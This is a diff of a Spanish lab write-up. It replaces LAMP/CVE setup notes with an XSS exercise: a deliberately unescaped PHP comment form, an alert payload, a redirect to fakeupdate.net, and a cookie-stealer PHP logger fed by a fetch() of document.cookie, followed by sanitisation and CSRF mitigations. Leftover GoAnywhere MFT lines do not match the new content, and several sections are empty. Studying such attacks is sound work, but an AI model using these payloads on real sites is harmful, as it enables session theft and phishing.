@@ -5,7 +5,7 @@ En esta documentación se realiza la **Explotación y Mitigación de Cross-Site 
 -  Creo un escenario multicontenedor con LAMP. la encontramos en [https://github.com/sprintcube/docker-compose-lamp.git](https://github.com/sprintcube/docker-compose-lamp.git).
 
 
-![LAMP 1](./images/apartado_uno/lamp1.png)
+![LAMP 1](./images/apartado_uno/xlamp1.png)
 **Vulnerabilidad analizada**
 
 - **Producto afectado:** GoAnywhere MFT  
@@ -17,275 +17,267 @@ La vulnerabilidad permite a un atacante no autenticado acceder a funcionalidades
 
 ---
 
-## 1.1 Instalación
+## 2.1 Código vulnerable
 
-Para la instalación de LAMP seguimos las instrucciones del repositorio.
-
-![LAMP 2](./images/apartado_uno/lamp2.png)
-
--  Creo carpeta
-
-![COPIA](./images/apartado_uno/carpeta.png)
-
--  Muestra de mi fichero .emv
-
-![EMV](./images/apartado_uno/emv.png)
-
-**`sample.env`**
+**`comment.php`**
 ```
-PHP_INI=./config/php/php.ini
-SSL_DIR=./config/ssl
+<?php
+// Activar errores en entorno de prácticas (opcional)
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
 
-# PHPMyAdmin
-UPLOAD_LIMIT=512M
-MEMORY_LIMIT=512M
+$comment = '';
 
-# Xdebug
-XDEBUG_LOG_DIR=./logs/xdebug
-XDEBUG_PORT=9003
-#XDEBUG_PORT=9000
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // SIN SEGURIDAD: se guarda el comentario tal cual
+    $comment = $_POST['comment'] ?? '';
+}
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Comentarios INSEGUROS</title>
+</head>
+<body>
+    <h1>Comentarios (versión insegura)</h1>
 
-# Possible values: mysql57, mysql8, mariadb103, mariadb104, mariadb105, mariadb106
-#
-# For Apple Silicon User: 
-# Please select Mariadb as Database. Oracle doesn't build their SQL Containers for the arm Architecure
+    <form method="post">
+        <label for="comment">Comentario:</label><br>
+        <!-- SIN htmlspecialchars: se muestra el contenido sin escapar -->
+        <textarea name="comment" id="comment" rows="4" cols="50"><?= $comment ?></textarea><br>
+        <button type="submit">Enviar</button>
+    </form>
 
-DATABASE=mysql8
-MYSQL_INITDB_DIR=./config/initdb
-MYSQL_DATA_DIR=./data/mysql
-MYSQL_LOG_DIR=./logs/mysql
-MYSQL_CNF=./config/mysql/my.cnf
-
-# If you already have the port 80 in use, you can change it (for example if you have Apache)
-HOST_MACHINE_UNSECURE_HOST_PORT=80
-
-# If you already have the port 443 in use, you can change it (for example if you have Apache)
-HOST_MACHINE_SECURE_HOST_PORT=443
-
-# If you already have the port 3306 in use, you can change it (for example if you have MySQL)
-HOST_MACHINE_MYSQL_PORT=3306
-
-# If you already have the port 8080 in use, you can change it (for example if you have PMA)
-HOST_MACHINE_PMA_PORT=8080
-HOST_MACHINE_PMA_SECURE_PORT=8443
-
-# If you already has the port 6379 in use, you can change it (for example if you have Redis)
-HOST_MACHINE_REDIS_PORT=6379
-
-# MySQL root user password
-MYSQL_ROOT_PASSWORD=tiger
-
-# Database settings: Username, password and database name
-#
-# If you need to give the docker user access to more databases than the "docker" db 
-# you can grant the privileges with phpmyadmin to the user.
-MYSQL_USER=docker
-MYSQL_PASSWORD=docker
-MYSQL_DATABASE=docker
+    <?php if ($comment !== ''): ?>
+        <h2>Comentario recibido (SIN sanitizar)</h2>
+        <!-- Aquí también se imprime directamente, vulnerable a XSS -->
+        <p><?= $comment ?></p>
+    <?php endif; ?>
+</body>
+</html>
 ```
 
 -  Muestra de mi fichero docker
 
 
-![DOCKER](./images/apartado_uno/dockercompose.png)
-
-
-**`docker-compose.yml`**
-```
-services:
-  webserver:
-    build:
-      context: ./bin/${PHPVERSION}
-    container_name: "${COMPOSE_PROJECT_NAME}-${PHPVERSION}"
-    restart: "always"
-    ports:
-      - "${HOST_MACHINE_UNSECURE_HOST_PORT}:80"
-      - "${HOST_MACHINE_SECURE_HOST_PORT}:443"
-    links:
-      - database
-    volumes:
-      - ${DOCUMENT_ROOT-./www}:/var/www/html:rw
-      - ${PHP_INI-./config/php/php.ini}:/usr/local/etc/php/php.ini
-      - ${SSL_DIR-./config/ssl}:/etc/apache2/ssl/
-      - ${VHOSTS_DIR-./config/vhosts}:/etc/apache2/sites-enabled
-      - ${LOG_DIR-./logs/apache2}:/var/log/apache2
-      - ${XDEBUG_LOG_DIR-./logs/xdebug}:/var/log/xdebug
-    environment:
-      APACHE_DOCUMENT_ROOT: ${APACHE_DOCUMENT_ROOT-/var/www/html}
-      PMA_PORT: ${HOST_MACHINE_PMA_PORT}
-      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
-      MYSQL_USER: ${MYSQL_USER}
-      MYSQL_PASSWORD: ${MYSQL_PASSWORD}
-      MYSQL_DATABASE: ${MYSQL_DATABASE}
-      HOST_MACHINE_MYSQL_PORT: ${HOST_MACHINE_MYSQL_PORT}
-      XDEBUG_CONFIG: "client_host=host.docker.internal remote_port=${XDEBUG_PORT}"
-    extra_hosts:
-      - "host.docker.internal:host-gateway"
-  database:
-    build:
-      context: "./bin/${DATABASE}"
-    container_name: "${COMPOSE_PROJECT_NAME}-${DATABASE}"
-    restart: "always"
-    ports:
-      - "127.0.0.1:${HOST_MACHINE_MYSQL_PORT}:3306"
-    volumes:
-      - ${MYSQL_INITDB_DIR-./config/initdb}:/docker-entrypoint-initdb.d
-      - ${MYSQL_DATA_DIR-./data/mysql}:/var/lib/mysql
-      - ${MYSQL_LOG_DIR-./logs/mysql}:/var/log/mysql
-      - ${MYSQL_CNF-./config/mysql/my.cnf}:/etc/my.cnf
-    environment:
-      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
-      MYSQL_DATABASE: ${MYSQL_DATABASE}
-      MYSQL_USER: ${MYSQL_USER}
-      MYSQL_PASSWORD: ${MYSQL_PASSWORD}
-  phpmyadmin:
-    image: phpmyadmin
-    container_name: "${COMPOSE_PROJECT_NAME}-phpmyadmin"
-    links:
-      - database
-    environment:
-      PMA_HOST: database
-      PMA_PORT: 3306
-      PMA_USER: root
-      PMA_PASSWORD: ${MYSQL_ROOT_PASSWORD}
-      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
-      MYSQL_USER: ${MYSQL_USER}
-      MYSQL_PASSWORD: ${MYSQL_PASSWORD}
-      UPLOAD_LIMIT: ${UPLOAD_LIMIT}
-      MEMORY_LIMIT: ${MEMORY_LIMIT}
-    ports:
-      - "${HOST_MACHINE_PMA_PORT}:80"
-      - "${HOST_MACHINE_PMA_SECURE_PORT}:443"
-    volumes:
-      - /sessions
-      - ${PHP_INI-./config/php/php.ini}:/usr/local/etc/php/conf.d/php-phpmyadmin.ini
-  redis:
-    container_name: "${COMPOSE_PROJECT_NAME}-redis"
-    image: redis:latest
-    ports:
-      - "127.0.0.1:${HOST_MACHINE_REDIS_PORT}:6379"
-```
-
-![LOCALHOST](./images/apartado_uno/localhost.png)
+![DOCKER](./images/apartado_uno/xdockercompose.png)
 
 ---
 
-## 1.2 Scripts
+## 2.2 Explotación 1 - XSS clásico
 
-Desde el artículo de INCIBE se accede a la web oficial del fabricante, donde se publica el aviso de seguridad correspondiente.
-
-En esta página se detallan:
-
-- La descripción técnica de la vulnerabilidad  
-- Las versiones afectadas  
-- Las medidas de mitigación y parches disponibles  
-
-![SCRIPTS](./images/apartado_uno/scripts.png)
-
-**`guardarConfiguraciones.sh`**
 ```
-#!/bin/bash
-#  guardarConfiguraciones.sh Directorio_Configuracion_a_Guardar
-# Con este script guardamos las configuraciones actuales del  Escenario LAMP
-
-if [ $# -ne 1 ]; then
-    echo "Introduce la ruta de la carpeta donde quieres guardar la configuración existente"
-    echo "Uso: guardarConfiguraciones.sh ruta_a_Directorio_Configuracion"
-    echo "Se creará la carpeta con  el ruta y nombre indicados."
-    exit
-fi
-
-if [ ! -d configuracionOriginal ]; then
-    echo "no estas en el directorio correcto."
-    echo "Situate en la carpeta del repositorio, en tu directorio debe de encontrarse la carpeta configuracionOriginal"
-    exit
-fi
-
-# Comprobamos que la carpeta no exista ya
-if [ -d "$1" ]; then
-    echo "La carpeta $1 ya existe. Por favor, elige otro nombre o elimina la carpeta existente."
-    exit
-
-fi
-# solicitamos confirmación al usuario sobre la acción a realizar
-read -r -p "¿Estás seguro de que quieres guardar la configuración actual? (s/n): " confirmation
-case "$confirmation" in
-    [sS])
-        echo "Guardando configuración..."
-        ;;
-    [nN])
-        echo "Acción de guardar datos cancelada."
-        exit 0
-        ;;
-    *)
-        echo "Opción no válida. Acción cancelada."
-        exit 1
-        ;;
-esac
-
-# Creamos la carpeta especificada y copiamos los datos y configuraciones indicados en dicha carpeta.
-mkdir -p "$1"
-echo "Configuración guardada correctamente en la carpeta $1"
-```
-**`restaurarConfiguracionOriginal.sh`**
-```
-#!/bin/bash
-# restaurarConfiguracionOriginal.sh Directorio_Configuracion_a_Guardar
-# Con este script restauramos la configuración original del  Escenario LAMP
-# pero primero guardamos
-
-if [ $# -ne 0 ]; then
-
-    echo "Uso: restaurarConfiguracionOriginal.sh"
-    echo "Script para restaurar la configuración original del entorno de prueba."
-    exit
-fi
-
-if [ ! -d configuracionOriginal ]; then
-    echo "no estas en el directorio correcto."
-    echo "Situate en la carpeta del repositorio, en tu directorio debe de encontrarse la carpeta configuracionOriginal"
-    exit
-fi
-read -r -p "¿Estás seguro de que quieres restaurar la configuración original? Se perderán los datos actuales. (s/n): " confirmation
-if [[ $confirmation != "s" ]]; then
-    echo "Restauración cancelada."
-    exit
-fi
-# Borramos los datos y configuraciones existentes
-rm -rf config/* data/* logs/* www/* 
-# Copiamos los datos y configuraciones por defecto
-cp -rp configuracionOriginal/config configuracionOriginal/data configuracionOriginal/logs configuracionOriginal/www ./
-echo "Configuración por defecto restaurada correctamente"
+<script>alert('Vulnerabilidad XSS!')</script>
+<h2 style="color:red;">Explotación 1</h2>
 ```
 ---
 
-## 1.3 Prueba funcionamiento scripts
+## 2.3 Explotación 2 - Redirección maliciosa
 
-En la información proporcionada por el fabricante se identifica el identificador CVE asignado a la vulnerabilidad.  
-Este identificador permite realizar el seguimiento oficial del fallo de seguridad en las diferentes bases de datos.  
-Accedemos a la página oficial de **cve.org**, donde se muestra la información básica del CVE:
+```
+<script>window.location='https://fakeupdate.net/win10ue/'</script>
+<h2 style="color:red;">Explotación 2</h2>
+```
+---
+## 2.4 Explotación 3 - Robo de cookies (Cookie Stealing)
 
-- Descripción de la vulnerabilidad  
-- Referencias oficiales  
-- Fecha de publicación  
+**`./www/cookieStealer/index.php`**
+```
+<?php
+// Obtener la fecha actual
+$date = date("Y/m/d H:i:s");
 
-![PSCRIPT1](./images/apartado_uno/pruebascript1.png)
-![PSCRIPT2](./images/apartado_uno/pruebascript2.png)
+// Obtener la dirección IP, User Agent y Referer
+$ip = $_SERVER['REMOTE_ADDR'];
+$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'No User Agent';
+$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
+
+// Obtener el parámetro 'cookie' de la URL
+$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No Cookie Provided';
+
+// Escapar las variables para evitar inyecciones de código
+$cookie = htmlspecialchars($cookie, ENT_QUOTES, 'UTF-8');
+$user_agent = htmlspecialchars($user_agent, ENT_QUOTES, 'UTF-8');
+$referer = htmlspecialchars($referer, ENT_QUOTES, 'UTF-8');
+
+// Intentar abrir el archivo de registro
+$file = fopen("cookies.txt", "a");
+
+if ($file === false) {
+    // Si no se puede abrir el archivo, responder con error
+    echo json_encode(["status" => 500, "message" => "Error opening file"]);
+    exit();
+}
+
+// Escribir la información en el archivo
+fwrite($file, "[+] Date: {$date}\n[+] IP: {$ip}\n[+] UserAgent: {$user_agent}\n[+] Referer: {$referer}\n[+] Cookies: {$cookie}\n---\n");
+
+// Cerrar el archivo
+fclose($file);
+
+// Responder con un JSON de éxito
+echo json_encode(["status" => 200]);
+?>
+```
+```
+<script>
+fetch("http://localhost/cookieStealer/index.php?cookie=" + document.cookie);
+</script>
+<h2 style="color:red;">Explotación 3</h2>
+
+```
+---
+## 3 Mitigación
+
+**`comment.php`**
+```
+<?php
+// ==========================
+// CONFIGURACIÓN DE ERRORES
+// ==========================
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+// ==========================
+// INICIAR SESIÓN (CSRF)
+// ==========================
+session_start();
+
+// Generar token CSRF si no existe
+if (!isset($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+
+// ==========================
+// VARIABLES
+// ==========================
+$comment = '';
+$error = '';
+$success = '';
+
+// ==========================
+// PROCESAMIENTO DEL FORMULARIO
+// ==========================
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+
+    // ==========================
+    // 1. VERIFICACIÓN CSRF
+    // ==========================
+    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+        $error = "Error: Token CSRF inválido.";
+    } else {
+
+        // ==========================
+        // 2️. MITIGACIÓN 1:
+        // USO DE filter_input()
+        // ==========================
+        $comment = filter_input(INPUT_POST, 'comment', FILTER_UNSAFE_RAW);
+
+        if ($comment === null) {
+            $comment = '';
+        }
+
+        // Eliminar espacios al inicio y final
+        $comment = trim($comment);
+
+        // ==========================
+        // 3️. MITIGACIÓN 2:
+        // VALIDACIÓN DE ENTRADA
+        // ==========================
+
+        $length = mb_strlen($comment, 'UTF-8');
+
+        if ($length === 0) {
+            $error = "El comentario no puede estar vacío.";
+        } elseif ($length > 500) {
+            $error = "El comentario no puede superar los 500 caracteres.";
+        }
+        // Permitir letras, números, espacios y puntuación básica
+        elseif (!preg_match('/^[\p{L}\p{N}\s.,!?¡¿()@#%&\-]*$/u', $comment)) {
+            $error = "El comentario contiene caracteres no permitidos.";
+        }
+        else {
+
+            // ==========================
+            // 4️. MITIGACIÓN 3:
+            // SANITIZAR CON htmlspecialchars()
+            // ==========================
+            $comment = htmlspecialchars(
+                $comment,
+                ENT_QUOTES | ENT_SUBSTITUTE,
+                'UTF-8'
+            );
+
+            $success = "Comentario publicado correctamente.";
+        }
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Comentarios Seguros</title>
+</head>
+<body>
+
+<h1>Formulario seguro con 3 mitigaciones</h1>
+
+<?php if ($error): ?>
+    <p style="color:red;">
+        <?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?>
+    </p>
+<?php endif; ?>
+
+<?php if ($success): ?>
+    <p style="color:green;">
+        <?= htmlspecialchars($success, ENT_QUOTES, 'UTF-8') ?>
+    </p>
+<?php endif; ?>
+
+<form method="post">
+
+    <label>Comentario:</label><br>
+
+    <textarea name="comment" rows="4" cols="50"></textarea><br><br>
+
+    <!-- Token CSRF -->
+    <input type="hidden"
+           name="csrf_token"
+           value="<?= htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8') ?>">
+
+    <button type="submit">Enviar</button>
+
+</form>
+
+<?php if ($success): ?>
+    <h2>Comentario recibido:</h2>
+    <p><?= $comment ?></p>
+<?php endif; ?>
+
+</body>
+</html>
+```
+---
+
+## 3.1 MITIGACIÓN 1 — Uso de filter_input()
+
+**`comment.php`**
 
 ---
 
+## 3.2 MITIGACIÓN 2 — Validación de entrada
 
-## 1.7 Descarga del registro CVE en formato JSON
-
-Finalmente, desde **cve.org** se accede al **registro CVE en formato JSON**, utilizado para el tratamiento automatizado de la información de vulnerabilidades.  
-Este registro contiene información estructurada sobre:  
-
-- CVE  
-- CWE  
-- CPE  
-- CAPEC  
-- Referencias oficiales
-
-[CVE-2024-0204.json](https://github.com/JBLeopard/Unidad2-TareaRA2-Joaquin/blob/main/docs/CVE-2024-0204.json)
+**`comment.php`**
 
 ---
+
+## 3.3 MITIGACIÓN 3 — Sanitización con htmlspecialchars()
+
+**`comment.php`**
+
+---
+
+## 4 BATERÍA DE PRUEBAS
